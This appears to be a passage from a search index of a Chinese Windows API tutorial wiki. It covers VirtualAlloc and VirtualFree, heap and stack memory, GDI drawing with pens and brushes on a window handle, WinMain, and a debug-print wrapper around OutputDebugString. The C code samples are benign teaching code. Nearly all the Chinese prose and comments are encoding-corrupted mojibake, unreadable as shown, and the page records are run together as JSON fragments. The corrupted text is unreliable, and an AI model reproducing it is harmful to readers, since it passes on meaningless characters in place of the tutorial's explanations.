MEM_RELEASï¼šé‡Šæ”¾ç‰©ç†å†…å­˜ï¼Œé‡Šæ”¾çº¿æ€§åœ°å€ï¼Œä½¿ç”¨è¿™ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°dwSizeå°±å¿…é¡»è®¾ç½®ä¸º0 12345678910111213141516#include &lt;Windows.h&gt;int main()&#123; LPVOID p = VirtualAlloc( NULL, // lpAddress: NULL è¡¨ç¤ºç³»ç»Ÿé€‰æ‹©åˆ†é…çš„åœ°å€ 0x1000 * 2, // dwSize: è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œè¿™é‡Œæ˜¯ 0x1000ï¼ˆå³4KBï¼‰çš„ä¸¤å€ MEM_COMMIT, // flAllocationType: å†…å­˜åˆ†é…ç±»å‹ï¼ŒMEM_COMMIT ä¸ä½†å ç”¨çº¿æ€§åœ°å€ï¼Œå¹¶ä¸”æŒ‚ä¸Šç‰©ç†é¡µ PAGE_READWRITE); // flProtect: å†…å­˜é¡µä¿æŠ¤é€‰é¡¹ï¼ŒPAGE_READWRITE è¡¨ç¤ºåˆ†é…çš„é¡µå¯è¯»å†™ VirtualFree( p, // lpAddress: æŒ‡å‘è¦é‡Šæ”¾çš„å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆ 0, // dwSize: é‡Šæ”¾çš„å†…å­˜å¤§å°ï¼Œå½“flFreeTypeä¸ºMEM_RELEASEæ—¶ï¼Œæ­¤å‚æ•°å¿…é¡»ä¸º0 MEM_RELEASE); // dwFreeType: é‡Šæ”¾æ“ä½œçš„ç±»å‹ï¼ŒMEM_RELEASE å®Œå…¨é‡Šæ”¾æŒ‡å®šåœ°å€çš„å†…å­˜å—ï¼ˆè™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜ï¼‰ return 0;&#125; å †å’Œæ ˆ ç”³è¯·å†…å­˜åªæœ‰ä¸¤ç§æ–¹å¼ï¼š é€šè¿‡VirtualAlloc/VirtualAllocExç”³è¯·ç§æœ‰å†…å­˜ï¼ˆPrivate Memoryï¼‰ é€šè¿‡CreateFileMappingæ˜ å°„çš„: Mapped Memory å †å’Œæ ˆæ˜¯å†…å­˜ç®¡ç†å½¢å¼ï¼Œå †æ˜¯ç”¨äºæƒ³è¦åŠ¨æ€ç”³è¯·å†…å­˜å¤§å°çš„æƒ…å†µï¼Œæ ˆæ˜¯ç»™å±€éƒ¨å˜é‡ä½¿ç”¨çš„ã€‚å®ƒä»¬å¹¶ä¸æ˜¯ç”³è¯·å†…å­˜ã€‚ å †å’Œæ ˆçš„æœ¬è´¨å°±æ˜¯ç§æœ‰å†…å­˜ã€‚ 12345678910int main(int argc, char* argv[])&#123; int x = 0x12345678; // æ ˆ int* y = (int*)malloc(sizeof(int) * 128); // å † printf(&quot;æ ˆï¼š%x &quot;, &amp;x); printf(&quot;å †ï¼š%x &quot;, y); return 0;&#125; è¿è¡Œè¾“å‡º123æ ˆï¼š12ff7cå †ï¼š3807b8 æ“ä½œç³»ç»ŸåŠ è½½PEæ—¶æŒ‰PEä¸­çš„ä¿¡æ¯ï¼Œç”¨VirtualAllocç”³è¯·å¥½äº†çº¿æ€§åœ°å€ç©ºé—´ã€‚ç¨‹åºä¸­çš„mallocä¸è¿‡æ˜¯ä»è¿™äº›å·²ç”³è¯·å¥½çš„ç©ºé—´æ‹¿ä¸€éƒ¨åˆ†å‡ºæ¥ç”¨ã€‚è¯æ˜æ–¹å¼ï¼šå“ªæ€•ç¨‹åºä¸­æ²¡æœ‰mallocç”³è¯·å †å†…å­˜ï¼Œä»æœ€ä¸Šé¢ç©ºç¨‹åºçš„çº¿æ€§åœ°å€åˆ†é…æƒ…å†µçœ‹ï¼Œ0x380-0x38fè¿™å—å†…å­˜éƒ½ä¼šè¢«ç”³è¯·ã€‚ æ ˆç©ºé—´ä¹Ÿæ˜¯ç”¨çš„æ“ä½œç³»ç»Ÿç”¨VirtualAllocæå‰ç”³è¯·å¥½çš„0x30-0x12fè¿™å—ç§æœ‰å†…å­˜ç©ºé—´ã€‚"},{"title":"çª—å£çš„æœ¬è´¨","path":"/wiki/Windows_API/çª—å£çš„æœ¬è´¨.html","content":"çª—å£çš„æœ¬è´¨ è€æ ·å­ï¼Œå…ˆä»æ•´ä½“ç»“æ„ä¸Šè¯´ä¸‹çª—å£çš„æœ¬è´¨ï¼Œä¾¿äºåç»­çš„å­¦ä¹ ã€‚ å‰é¢æè¿‡ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„4GBè™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œä½2Gä¸ºè¿›ç¨‹è‡ªå·±æ‹¥æœ‰ï¼Œç§°åšç”¨æˆ·ç©ºé—´ï¼Œé«˜2Gæ˜¯å†…æ ¸ç©ºé—´ï¼Œä¸ºæ‰€æœ‰è¿›ç¨‹å…±åŒæ‹¥æœ‰ã€‚ç”¨æˆ·ç©ºé—´æ˜¯ç”±å¾ˆå¤šä¸ªæ¨¡å—ç»„æˆï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ï¼ŒåŒæ ·ä¹Ÿæ˜¯ç”±å„ç§å„æ ·çš„æ¨¡å—ç»„æˆã€‚ åœ¨å†…æ ¸ç©ºé—´ä¸­ï¼Œæœ‰ä¸€ä¸ªæ¨¡å—å«ntoskrnl.exeï¼Œwindows apiç¼–ç¨‹ä¸­ä¸è¿›ç¨‹ã€çº¿ç¨‹ã€å†…å­˜ç®¡ç†ç­‰ç›¸å…³åŠŸèƒ½çš„å®ç°åœ¨è¿™ä¸ªæ¨¡å—ä¸­ï¼›è¿˜æœ‰ä¸€ä¸ªæ¨¡å—å«win32k.sysï¼Œåœ¨è¿™ä¸ªæ¨¡å—ä¸­å®ç°äº†å›¾å½¢ç•Œé¢ã€æ¶ˆæ¯ç®¡ç†ã€‚å¼€å‘è€…åœ¨åº”ç”¨å±‚è°ƒç”¨CreateProcessï¼Œçœ‹ä¼¼æ˜¯è°ƒç”¨æ¥è‡ªäºkernel32.dllçš„apiï¼Œå®é™…ä¸Škernel32.dllæ˜¯ntoskrnl.exeæä¾›çš„æ¥å£ï¼ŒçœŸæ­£çš„å®ç°åœ¨ntoskrnl.exeä¸­ã€‚åŒæ ·çš„ï¼Œuser32.dllå’Œgdi32.dllæ˜¯win32k.sysæä¾›çš„æ¥å£ï¼ŒçœŸæ­£çš„å®ç°åœ¨win32k.sysä¸­ã€‚ å¦‚æœæƒ³ä½¿ç”¨windowsç³»ç»Ÿæä¾›çš„å·²ç»ç”»å¥½çš„çª—å£ï¼Œé‚£ç”¨çš„æ˜¯user32.dllï¼Œä¹Ÿç§°GUIç¼–ç¨‹ï¼›å¦‚æœä¸ä½¿ç”¨windowsç³»ç»Ÿå·²ç”»å¥½çš„çª—å£ï¼Œè€Œæ˜¯æƒ³è‡ªå·±ç”»çª—å£ï¼Œæ¯”å¦‚ç”»ä¸€æœµèŠ±ï¼Œé‚£ä½¿ç”¨çš„æ˜¯gdi32.dllï¼Œä¹Ÿç§°GDIç¼–ç¨‹ã€‚ ä¹‹å‰åœ¨è¿›ç¨‹ç¯‡çš„apié‡Œæåˆ°è¿‡HANDLEå¥æŸ„æ˜¯è¿›ç¨‹ç§æœ‰å¥æŸ„è¡¨ä¸­çš„ä¸€ä¸ªç´¢å¼•å·ï¼Œè¿›ç¨‹Bæ‹¿ç€è¿›ç¨‹Açš„HANDLEï¼ˆç´¢å¼•å·ï¼‰å»æ“ä½œæ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚åœ¨å›¾å½¢ç•Œé¢ç¼–ç¨‹ä¸­ï¼Œä¹Ÿæœ‰å¥æŸ„çš„æ¦‚å¿µï¼Œå®ƒå«HWNDï¼Œä¸è¿›ç¨‹çš„ç§æœ‰å¥æŸ„ä¸åŒï¼Œå®ƒæ˜¯å…¨å±€çš„ã€‚ win32k.sysä¸­æœ‰ä¸€å †å·²ç»å®ç°å¥½ç”»å¥½çš„çª—å£ï¼Œæ¯”å¦‚ä¸‹å›¾ä¸­çš„Açª—å£ï¼ŒBçª—å£ã€‚æœ‰ä¸€å¼ å…¨å±€çš„å¥æŸ„è¡¨ï¼Œè®°å½•äº†è¿™äº›çª—å£å¥æŸ„å’Œçª—å£çš„æ˜ å°„å…³ç³»ã€‚åœ¨åº”ç”¨å±‚ï¼Œè¿›ç¨‹Xé€šè¿‡HWNDï¼š1æ¥ä½¿ç”¨Açª—å£ï¼ˆå®‰å…¨ï¼Œç”¨å¥æŸ„åšä¸€å±‚éš”ç¦»ï¼‰ã€‚è¿™ä¸ªHWNDï¼š1åœ¨è¿›ç¨‹Yä¸­æ˜¯æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºçª—å£çš„å¥æŸ„è¡¨æ˜¯å…¨å±€çš„ï¼Œä¸åƒè¿›ç¨‹é‚£æ ·æ˜¯ç§æœ‰çš„ã€‚ GDIç¼–ç¨‹åˆæ¢ ä¸å¿…è€—è´¹å¤ªå¤šå¿ƒæ€åœ¨GDIä¸Šï¼Œè¿™é‡Œæ˜¯ä¸ºäº†é€šè¿‡GDIç¼–ç¨‹æ¥åˆæ­¥ä½“ä¼šçª—å£çš„æœ¬è´¨ï¼Œæ¶ˆæ¯æœºåˆ¶çš„æœ¬è´¨ã€‚ GDIï¼ˆGraphics Device Interfaceï¼‰ï¼Œå›¾å½¢è®¾å¤‡æ¥å£ã€‚ ä½¿ç”¨GDIæ¥ç”»çª—å£çš„å¤§è‡´æ­¥éª¤æ˜¯ï¼š è®¾å¤‡å¯¹è±¡ï¼ˆç”»åœ¨å“ªï¼‰ è·å–è®¾å¤‡çš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆDCï¼‰ å›¾åƒå¯¹è±¡å¹¶è®¾ç½®ç›¸å…³å±æ€§ï¼ˆä¸è®¾ç½®å°±æ˜¯ä½¿ç”¨é»˜è®¤çš„ï¼‰ å›¾åƒå¯¹è±¡ ä½œç”¨ ç”»ç¬”(Pen) å½±å“çº¿æ¡ï¼ŒåŒ…æ‹¬é¢œè‰²ã€ç²—ç»†ã€è™šå®ã€ç®­å¤´å½¢çŠ¶ç­‰ ç”»åˆ·(Brushes) å½±å“å¯¹å½¢çŠ¶ã€åŒºåŸŸç­‰æ“ä½œï¼Œå¦‚ä½¿ç”¨çš„é¢œè‰²ã€æ˜¯å¦æœ‰é˜´å½±ç­‰ å­—ä½“(Fonts) å½±å“æ–‡å­—è¾“å‡ºçš„å­—ä½“ ä½å›¾(Bitmaps) å½±å“ä½å›¾åˆ›å»ºã€ä½å›¾æ“ä½œå’Œä¿å­˜ç­‰ å°†ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆDCï¼‰ä¸å›¾åƒå¯¹è±¡è¿›è¡Œå…³è” å¼€å§‹ç”» é‡Šæ”¾èµ„æº ä¾‹1 ç¡®å®šè®¾å¤‡å¯¹è±¡ï¼ˆç”»åœ¨å“ªï¼‰ é€šä¿—ç‚¹è®²ï¼Œå°±æ˜¯åœ¨å“ªä¸ªçª—å£ä¸Šç”»ã€‚å¯ä»¥ä½¿ç”¨spy++è·å–ç›®æ ‡çª—å£çš„handleå€¼ï¼Œå‡è®¾è¦åœ¨dbgview64ä¸Šçš„è¿™ä¸ªçª—å£ä¸Šç”»ï¼Œè·å–åˆ°çš„handleå€¼æ˜¯0x145126Aã€‚å¦‚æœæ˜¯NULLï¼Œé»˜è®¤æ˜¯æ¡Œé¢ã€‚ 1HWND hwnd = (HWND)0x145126A; // çª—å£å¥æŸ„ è·å–è®¾å¤‡çš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆDCï¼‰ æˆ‘ä»¬å¹¶ä¸æ˜¯ç›´æ¥å°±åœ¨è¿™ä¸ªçª—å£ä¸Šç”»ï¼Œè€Œæ˜¯åœ¨å†…å­˜ä¸­ç”»ã€‚åœ¨å†…å­˜ä¸­ç”»å®Œåï¼Œæ“ä½œç³»ç»Ÿä¼šå°†å†…å­˜ä¸­çš„å†…å®¹è´´åˆ°ç›®æ ‡çª—å£ä¸Šã€‚è·å–è®¾å¤‡çš„ä¸Šä¸‹æ–‡å¯¹è±¡çš„æ„æ€å°±æ˜¯æ‰¾è¿™ä¹ˆä¸€å—å†…å­˜ï¼Œå°†è¿™å—å†…å­˜å’Œè®¾å¤‡å¯¹è±¡å…³è”èµ·æ¥ã€‚ 1HDC hdc = GetDC(hwnd); åˆ›å»ºå›¾åƒå¯¹è±¡å¹¶è®¾ç½®ç›¸å…³å±æ€§ æœ‰ç”»ç¬”ï¼Œç”»åˆ·ï¼Œå­—ä½“ï¼Œä½å›¾è¿™äº›å›¾åƒå¯¹è±¡ï¼Œè¿™å–å†³äºä½ æƒ³ç”»å•¥ã€‚å¦‚æœæƒ³ç”»çº¿æ¡å°±ç”¨ç”»ç¬”ï¼Œæƒ³ç”»çŸ©å½¢å°±ç”¨ç”»åˆ·ï¼Œè¿™é‡Œä»¥ç”»ç¬”ä¸ºä¾‹ï¼Œåˆ›å»ºä¸€ä¸ªç”»ç¬”ã€‚ 12345HPEN hpen = CreatePen( PS_SOLID, // pen style å®çº¿ 5, // pen width çº¿æ¡å®½åº¦ RGB(0xFF, 00, 00) // pen color çº¿æ¡é¢œè‰²ï¼Œç”±RGBä¸‰ä½ç»„æˆï¼Œè¿™é‡Œçš„ä¾‹å­æ˜¯çº¯çº¢è‰²); æ¯ä¸ªdcéƒ½æœ‰ä¸€ä¸ªé»˜è®¤çš„ç”»ç¬”ï¼Œç”»åˆ·ï¼Œå­—ä½“ï¼Œä½å›¾è¿™äº›å›¾åƒå¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰ç¬¬3æ­¥ï¼ˆåˆ›å»ºå›¾åƒå¯¹è±¡å¹¶è®¾ç½®ç›¸å…³å±æ€§ï¼‰ï¼Œä¹Ÿèƒ½ç›´æ¥åˆ°ç¬¬5æ­¥å¼€å§‹ç”»ï¼Œé‚£ä¹ˆä½¿ç”¨çš„å°±æ˜¯é»˜è®¤çš„å›¾åƒå¯¹è±¡ã€‚ å°†ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆDCï¼‰ä¸å›¾åƒå¯¹è±¡è¿›è¡Œå…³è” è¦ä¸å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªç”»ç¬”Penï¼Œå’ŒDCå•¥å…³ç³»æ²¡æœ‰ï¼Œè¦å…³è”èµ·æ¥ã€‚ 1SelectObject(hdc, hpen); å¼€å§‹ç”» æ¯”å¦‚ç”»ç›´çº¿ã€‚ç”µè„‘çš„å±å¹•å·¦ä¸Šè§’æ˜¯åæ ‡(0,0)ï¼Œå³ä¸‹è§’æ˜¯æœ€å¤§çš„xå’Œyï¼Œ(x,y)ã€‚LineToæ˜¯ä»å½“å‰ä½ç½®ç”»åˆ°(ç¬¬äºŒä¸ªå‚æ•°,ç¬¬ä¸‰ä¸ªå‚æ•°)(x,y) å¯ä»¥ç”¨MoveToExå‡½æ•°ä¿®æ”¹å½“å‰ä½ç½®çš„ç‚¹ä½ã€‚ 123LineTo(hdc, // device context handle 400, // x-coordinate of ending point 400); // y-coordinate of ending point é‡Šæ”¾èµ„æº è·å–å¥æŸ„å’Œé‡Šæ”¾å¥æŸ„æ˜¯æˆå¯¹çš„ Createå¯¹åº”Deleteï¼Œåˆ›å»º&lt;-&gt;åˆ é™¤ï¼Œæ¯”å¦‚CreatePen&lt;-&gt;DeletePen; Getå¯¹åº”Releaseï¼Œå¾—åˆ°&lt;-&gt;é‡Šæ”¾ï¼Œæ¯”å¦‚GetDC&lt;-&gt;ReleaseDCã€‚ 123// 6. é‡Šæ”¾èµ„æºDeleteObject(hpen);ReleaseDC(hwnd,hdc); å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233#include &lt;windows.h&gt;int main()&#123; // 1. è®¾å¤‡å¯¹è±¡ï¼ˆç”»åœ¨å“ªï¼‰ HWND hwnd = (HWND)0x145126A; // çª—å£å¥æŸ„ // 2. è·å–è®¾å¤‡çš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆDCï¼‰ HDC hdc = GetDC(hwnd); // 3. åˆ›å»ºå›¾åƒå¯¹è±¡å¹¶è®¾ç½®ç›¸å…³å±æ€§ HPEN hpen = CreatePen( PS_SOLID, // pen style å®çº¿ 5, // pen width çº¿æ¡å®½åº¦ RGB(0xFF, 00, 00) // pen color çº¿æ¡é¢œè‰²ï¼Œç”±RGBä¸‰ä½ç»„æˆï¼Œè¿™é‡Œçš„ä¾‹å­æ˜¯çº¯çº¢è‰² ); // 4. å°†ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆDCï¼‰ä¸å›¾åƒå¯¹è±¡è¿›è¡Œå…³è” SelectObject(hdc, // handle to DC hpen // handle to object ); // 5. å¼€å§‹ç”» LineTo(hdc, // device context handle 400, // x-coordinate of ending point 400); // y-coordinate of ending point // 6. é‡Šæ”¾èµ„æº DeleteObject(hpen); ReleaseDC(hwnd, hdc); return 0;&#125; ä¾‹2 æ“ä½œç³»ç»Ÿä¹Ÿæä¾›äº†ä¸€äº›ç°æˆçš„å›¾åƒå¯¹è±¡ä¾›å¼€å‘è€…ä½¿ç”¨ï¼Œä½¿ç”¨GetStockObjectè·å¾—è¿™ä¸ªç°æˆçš„è®¾ç½®å¥½çš„å›¾åƒå¯¹è±¡ã€‚ 12345678910111213141516171819202122232425262728#include &lt;windows.h&gt;int main()&#123; // 1. è®¾å¤‡å¯¹è±¡ï¼ˆç”»åœ¨å“ªï¼‰ HWND hwnd = (HWND)0x145126A; // çª—å£å¥æŸ„ // 2. è·å–è®¾å¤‡çš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆDCï¼‰ HDC hdc = GetDC(hwnd); // 3. åˆ›å»ºå›¾åƒå¯¹è±¡å¹¶è®¾ç½®ç›¸å…³å±æ€§ HBRUSH hBrush = (HBRUSH)GetStockObject(DC_BRUSH); // ä½¿ç”¨ç°æˆçš„ç”»åˆ·å›¾åƒå¯¹è±¡ SetDCBrushColor(hdc, RGB(0xFF, 0xFF, 00)); // è®¾ç½®ç”»åˆ·é¢œè‰² // 4. å°†ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆDCï¼‰ä¸å›¾åƒå¯¹è±¡è¿›è¡Œå…³è” SelectObject(hdc, // handle to DC hBrush // handle to object ); // 5. å¼€å§‹ç”» Rectangle(hdc, 0, 0, 400, 400); // çŸ©å½¢èŒƒå›´æ˜¯(0,0)åˆ°(400,400) // 6. é‡Šæ”¾èµ„æº DeleteObject(hBrush); ReleaseDC(hwnd, hdc); return 0;&#125; ä¸æ–­é‡ç»˜çš„çª—å£ æ— è®ºå¤šä¹ˆå¤æ‚çš„çª—å£ï¼Œéƒ½æ˜¯ç”»å‡ºæ¥çš„ã€‚åœ¨ä½¿ç”¨windowsç³»ç»Ÿæ—¶ä¼šçŸ¥é“ï¼Œå½“æˆ‘ä»¬ç”¨Açª—å£æŒ¡ä½Bçª—å£ï¼Œæ¯”å¦‚ç”¨cmdæŒ¡ä½notepadçª—å£çš„éƒ¨åˆ†å†…å®¹ï¼Œç„¶åå°†cmdçª—å£ç§»å¼€åï¼ŒnotepadåŸæœ¬è¢«é®æŒ¡çš„éƒ¨åˆ†åˆèƒ½æ˜¾ç¤ºå‡ºæ¥ã€‚è¿™æ˜¯å› ä¸ºæŒ¡ä½ç§»å¼€åï¼Œwindowsåˆé‡æ–°ç”»äº†ä¸€éã€‚æ‰€ä»¥ï¼Œçª—å£æ˜¯ä¸æ–­ç»˜åˆ¶çš„ã€‚ åœ¨ä¸Šé¢ä¸¤ä¸ªä¾‹å­ä¸­ï¼Œæ¯”å¦‚ä¾‹2ï¼Œç”»äº†ä¸€ä¸ªçŸ©å½¢ï¼Œå½“ç”¨å¦ä¸€ä¸ªçª—å£æŒ¡ä½è¿™ä¸ªé»„è‰²çŸ©å½¢åï¼Œç„¶åç§»å¼€æŒ¡ä½ç‰©ï¼Œå°±å†ä¹Ÿçœ‹ä¸è§è¢«æŒ¡ä½çš„é»„è‰²çŸ©å½¢äº†ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬çš„ç¨‹åºåªç”»äº†ä¸€æ¬¡ã€‚æŒ¡ä½ï¼Œç§»åŠ¨ï¼Œå°±æ²¡äº†ã€‚è€Œåœ¨windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œçª—å£éƒ½æ˜¯åœ¨ä¸æ–­åœ°ç»˜åˆ¶ï¼Œæ¯æ¬¡çš„æŒ¡ä½ç§»å¼€ï¼Œè¢«æŒ¡ä½çš„éƒ¨åˆ†åˆé‡æ–°ç”»äº†ä¸€æ¬¡ã€‚"},{"title":"ç¬¬ä¸€ä¸ªçª—å£ç¨‹åº","path":"/wiki/Windows_API/ç¬¬ä¸€ä¸ªçª—å£ç¨‹åº.html","content":"å…¥å£å‡½æ•° æ§åˆ¶å°ç¨‹åºçš„å…¥å£å‡½æ•°æ˜¯mainå‡½æ•°ï¼Œåœ¨win32ç¨‹åºä¸­ï¼Œå…¥å£å‡½æ•°æ˜¯WinMainã€‚ 123456int APIENTRY WinMain( [in] HINSTANCE hInstance, // handle to current instance [in, optional] HINSTANCE hPrevInstance, // handle to previous instance [in] LPSTR lpCmdLine, // command line [in] int nShowCmd // show state); hInstanceï¼šè¯¥å¥æŸ„æ˜¯å½“å‰æ¨¡å—åœ¨è¿›ç¨‹ç©ºé—´ä¸­çš„é¦–åœ°å€ï¼ˆåŠ è½½åˆ°å†…å­˜æ—¶çš„åŸºåœ°å€ImageBaseï¼‰ A handle to the current instance of the application.åº”ç”¨ç¨‹åºå½“å‰å®ä¾‹çš„å¥æŸ„ ä¸ªäººç†è§£ï¼šå†…æ ¸å¯¹è±¡åœ¨0ç¯ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œä¸ä¼šç›´æ¥ç»™å†…æ ¸åœ°å€ç»™åº”ç”¨å±‚ï¼Œè€Œæ˜¯å¥æŸ„è¡¨ä¸­çš„ä¸€ä¸ªç¼–å·ï¼ˆHandleï¼‰ è¿™ä¸ªæ¨¡å—çš„åŸºåœ°å€åœ¨3ç¯ï¼Œæ²¡å†å¥—ä¸€ä¸ªç¼–å·ï¼ŒhInstanceç›´æ¥å°±æ˜¯3ç¯çš„è¿™ä¸ªåœ°å€ hPrevInstanceï¼šæ°¸è¿œä¸ºNULLï¼Œä¸ç”¨ç†è§£ã€‚æœ‰éœ€è¦æœªæ¥åœ¨æŸ¥MSDN lpCmdLineï¼šå¯åŠ¨è¿™ä¸ªç¨‹åºæ—¶çš„å‘½ä»¤è¡Œå‚æ•° nShowCmdï¼šControls how the window is to be shown. This parameter can be any of the values that can be specified in the nCmdShow parameter for the ShowWindow function. ä»»ä½•è¿›ç¨‹éƒ½æ˜¯ç”±çˆ¶è¿›ç¨‹åˆ›å»ºçš„ï¼Œè¿™ä¸ªwin32æ˜¯ä¸ªç¨‹åºï¼Œå®ƒçš„lpCmdLineå’ŒnShowCmdç”±CreateProcesså‡½æ•°ä¸­çš„lpCommandLineå’ŒlpStartupInfoå‚æ•°æ¥ä¼ é€’ 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // LPWSTR lpCommandLine, // å‘½ä»¤è¡Œå‚æ•° LPSECURITY_ATTRIBUTES lpProcessAttributes, // LPSECURITY_ATTRIBUTES lpThreadAttributes, // BOOL bInheritHandles, // DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // å¯åŠ¨ä¿¡æ¯ LPPROCESS_INFORMATION lpProcessInformation //); æ‰“å°hInstanceçš„å€¼ï¼ˆå½“å‰æ¨¡å—çš„å†…å­˜åœ°å€ï¼‰æ¥çœ‹ä¸€ä¸‹ åœ¨win32ç¨‹åºä¸­æƒ³è¦è¾“å‡ºä¿¡æ¯æ²¡æ³•ä½¿ç”¨printfï¼ˆæ²¡æ§åˆ¶å°äº†ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨OutputDebugStringå‡½æ•° 123void OutputDebugString( LPCTSTR lpOutputString); ä½†OutputDebugStringåªèƒ½æ‰“å°å›ºå®šå­—ç¬¦ï¼Œæ²¡æ³•åšåˆ°printfé‚£æ ·å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ ¼å¼åŒ–ã€‚å¦‚æœè¦æ ¼å¼åŒ–ï¼Œè¦å…ˆç”¨sprintfå‡½æ•°è¿›è¡Œæ ¼å¼åŒ–ã€‚ 12345678910111213141516#include &lt;Windows.h&gt;#include &lt;stdio.h&gt; //sprintfint APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DWORD dwAddr = (DWORD)hInstance; char szOutBuff[0x80]; sprintf(szOutBuff, &quot;hInstance address: %x &quot;, dwAddr); OutputDebugString(szOutBuff); return 0;&#125; è¿è¡Œï¼Œåœ¨xpç³»ç»Ÿä¸‹è¿™ä¸ªwin32æ¨¡å—çš„å†…å­˜åœ°å€æ˜¯0x400000 åœ¨VC6çš„å·¥å…·-è®¾ç½®-é“¾æ¥ï¼Œåˆ†ç±»ï¼šè¾“å‡ºï¼Œä¿®æ”¹åŸºåœ°å€ä¸º5242880ï¼ˆå¯¹åº”0x500000ï¼‰ï¼Œç¼–è¯‘å†æ¬¡è¿è¡Œï¼Œè¾“å‡ºæ˜¯500000ã€‚è¯´æ˜hInstanceï¼ˆå½“å‰æ¨¡å—çš„å†…å­˜åœ°å€ï¼‰å°±æ˜¯ImageBase è‡ªå·±å°è£…ä¸€ä¸ªå˜å‚è¾“å‡ºå‡½æ•°åœ¨win32ç¨‹åºä¸­æ‰“å°ä¿¡æ¯ åœ¨win32ç¨‹åºä¸‹æ²¡æœ‰æ§åˆ¶å°ï¼Œæ²¡æ³•ç”¨printfè¾“å‡ºã€‚OutputDebugStringå¯ä»¥æ‰“å°å›ºå®šå­—ç¬¦ï¼Œä½†æ²¡æ³•å˜å‚ã€‚å¯ä»¥è‡ªå·±å°è£…ä¸€ä¸ª OutputDebugStringF.h1234567891011121314#pragma once#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt;#pragma warning(disable : 4996)void __cdecl OutputDebugStringF(const char* format, ...);#ifdef _DEBUG #define DbgPrintf OutputDebugStringF #else #define DbgPrintf(...) ((void)0)#endif OutputDebugStringF.cpp12345678910111213141516#include &quot;OutputDebugStringF.h&quot;void __cdecl OutputDebugStringF(const char* format, ...)&#123; va_list vlArgs; char* strBuffer = (char*)GlobalAlloc(GPTR, 4096); if (!strBuffer) return; va_start(vlArgs, format); _vsnprintf(strBuffer, 4096 - 1, format, vlArgs); va_end(vlArgs); strcat(strBuffer, &quot; &quot;); OutputDebugStringA(strBuffer); GlobalFree(strBuffer);&#125; main.cppæµ‹è¯•ç¨‹åº1234567891011#include &lt;windows.h&gt;#include &quot;OutputDebugStringF.h&quot;int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)&#123; // æµ‹è¯• DbgPrintf DbgPrintf(&quot;Hello, World!&quot;); DbgPrintf(&quot;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•: %d + %d = %d&quot;, 2, 3, 2 + 3); return 0;&#125; DEBUGæ¨¡å¼Releaseæ¨¡å¼åœ¨DEBUGæ¨¡å¼ä¸‹ï¼ŒDbgPrintfè¢«æ›¿æ¢æˆOutputDebugStringFï¼Œå°±æ˜¯è‡ªå·±å°è£…çš„å‡½æ•° åœ¨éDEBUGæ¨¡å¼ä¸‹ï¼ŒDbgPrintféƒ½è¢«æ›¿æ¢æˆ((void)0) OutputDebugStringF.h123//çœç•¥...#else #define DbgPrintf(...) ((void)0) ...æ˜¯å˜å‚ï¼Œä¸Šé¢è¿™ä¸ªå®å¯ä»¥æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°ï¼Œç„¶åéƒ½ä¼šè¢«æ›¿æ¢æˆ((void)0)ã€‚ å®æ›¿æ¢ç¤ºä¾‹123456DbgPrintf(&quot;Hello, World!&quot;);DbgPrintf(&quot;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•: %d + %d = %d&quot;, 2, 3, 2 + 3);//éƒ½ä¼šè¢«æ›¿æ¢æˆ((void)0); ((void)0); ((void)0);ä¸ä¼šæœ‰ä»»ä½•å®é™…çš„è¾“å‡ºæˆ–æ“ä½œå‘ç”Ÿ OutputDebugStringF.hçš„å¦ä¸€ç§å†™æ³•OutputDebugStringF.h123456789101112#pragma once#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#pragma warning(disable : 4996)void __cdecl OutputDebugStringF(const char* format, ...);#ifdef _DEBUG#define DbgPrintf OutputDebugStringF#else#define DbgPrintf#endif1#define DbgPrintfåœ¨éDEBUGæ¨¡å¼ä¸‹ï¼Œé¢„å¤„ç†å™¨ä¼šå°†DbgPrintfæ›¿æ¢ä¸ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚å®æ›¿æ¢ç¤ºä¾‹123456DbgPrintf(&quot;Hello, World!&quot;);DbgPrintf(&quot;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•: %d + %d = %d&quot;, 2, 3, 2 + 3);//ä¼šè¢«æ›¿æ¢æˆ(&quot;Hello, World!&quot;); //æ— æ•ˆCè¯­å¥ï¼Œå•¥ä¹Ÿä¸ä¼šå‘ç”Ÿ(&quot;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•: %d + %d = %d&quot;, 2, 3, 2 + 3); //æ— æ•ˆCè¯­å¥ï¼Œå•¥ä¹Ÿä¸ä¼šå‘ç”Ÿ 